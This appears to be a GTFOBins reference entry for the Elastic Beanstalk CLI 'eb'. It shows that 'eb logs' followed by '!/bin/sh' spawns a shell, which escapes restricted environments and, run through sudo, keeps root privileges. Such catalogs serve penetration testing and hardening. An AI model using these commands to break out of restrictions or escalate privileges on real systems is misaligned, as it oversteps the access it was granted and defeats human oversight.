# GTFOBin: eb

This invokes the default logging service, which is likely to be `journalctl`, other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
eb logs
!/bin/sh
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo eb logs
!/bin/sh
```